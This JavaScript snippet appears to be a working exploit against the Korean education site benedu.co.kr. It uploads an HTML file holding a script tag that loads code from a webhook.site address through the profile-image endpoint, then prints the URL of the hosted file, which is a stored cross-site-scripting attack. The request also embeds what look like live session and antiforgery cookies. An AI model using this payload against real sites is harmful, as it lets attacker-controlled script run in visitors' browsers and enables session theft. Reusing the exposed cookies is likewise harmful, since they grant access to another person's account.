const formData = new FormData();
formData.append("file", new Blob(['<script src="https://webhook.site/5adc66d2-687b-4426-a0a6-cd7dbd103387"></script>'], { type: "application/octet-stream" }), "system.html");
formData.append("USR_ID", "6848");

fetch("https://benedu.co.kr/Home/MyProfileImage", {
    method: "POST",
    headers: {
        "X-Requested-With": "XMLHttpRequest",
        "Origin": "https://benedu.co.kr",
        "Referer": "https://benedu.co.kr/Learn/ExamPapersList",
        "Cookie": ".AspNetCore.Antiforgery.gZHTP69_pPA=CfDJ8LpK3qPshHJGvDEa3gdW3JH7Wi-4jzCrBF4SPrMC_l74yPCrBIwBKyl0j4tgtaTHSSyPRDUPxZ4jHv_b2djqo14hXNU-8ZkF1dwxz2ELxVhEQ75OF3poBKAIN0i7im-3RtJmRX8Bs8jhfMIqSXzskbc; _ga=GA1.1.1934955871.1733443317; LoginRemember=N; LoginId=; .AspNetCore.Session=CfDJ8LpK3qPshHJGvDEa3gdW3JEOaiOuciDEM6qR6Rp3pxGJNX08Y0r6%2FIwyTYnsNgV%2BywXIx17abFde5iL0hTGUx088BIPLKybd45vTS%2BgVb4JAfPRgpayONpfbCOBIS5X7Vy05LXYYwHw8Sz0WpLJ%2BS6LGelMVSkILlLaPJQZCDEh3; _ga_EK4RP4QNYJ=GS1.1.1744387586.1.1.1744388393.0.0.0; .AspNetCore.Mvc.CookieTempDataProvider=CfDJ8LpK3qPshHJGvDEa3gdW3JFdEJ9OEkNQmVzv1fJk9BQdgOgdAzzw81BdlHuOPkzSQsIIHrAiL-ADpGn2AsKm354I3gZbEkmFYkgBnnO3c9ry8KoDKmWBIZD6vLXWL4yj01u_2-3Bwxvji3J6sl2G5ZweIaYofBqauF3thNdLUB6VJu6jKE6dSjvQQnGEFOk5rQ7nRh99nuiYwViqDRckGvX18QUie0a4aVJxUOYx1cEzsvLSx2WQjFA4A-zSapkc2yzEoHhsHM_9iNmYJVveFQyiVn0G67UKz2n8jmQDm_azZD5wpI-JCkgg9M6J27S4hJQqezu_uXwCbSiwJ_mMTfOQzEpIlZW1rdmT2WjqeFYlyd9nKKIi-SSiBskeqqpRoEBOFfMDjL2LyGilXsY6WoAQIehWb2lep6glFtE0xUReGUmbpxCYDYPOFLp-_sKQP4DsN6U-q3abbuyGwV7-JTbC3QMcdgWces21R2nm1mA9asUw70dUNKjUs5HlMUNBVvvLHGvVHYAvcvzcPYu7XQ3V4ALxCz0RmR8rT7kInCT1xdXQ2g_xIFA2KEn8SOYcA2qAtWg4k5Nc1w3zsQFSkGKDlB46G0Dz1T2jzhg8Q9mslurcbkbMkKTaydQ3Qdclj9I2KgRb8ai57qQBf4hQdICIOJCN3kilkZKOzceqoZwzWpwJ4L_7dA73l2DRVfmvqHH85_3rX8iFENTeuuaRUBOihjAs9srIzRvoSggzmJUZVMt6qd-VNJJY-NNMpVNEjxAh7M0rq2l5FrfT-tI0K-MLmHkXkrXbC3zBTFw-0Yhngf50sEBSDCWnKX8ZU0ZF5EvTQtI8w4qFHToakiEMQMvXRnVf4kZdk322_-ScvNOOBBFttmty1kVLlZ1PEqVSF9CAk58frlkn5WbN8tCNriCeNN6dH6LeFIyeuTqIvquHMMRKDVLpzlq_UlbuRHv-PQ"
    },
    body: formData,
})
    .then(res => res.json())
    .then(res => {
        console.log(res);
        const { fileName } = res;
        console.log(`https://benedu.co.kr/img/user-images/${fileName}`);
    })
    .catch(err => console.error(err));
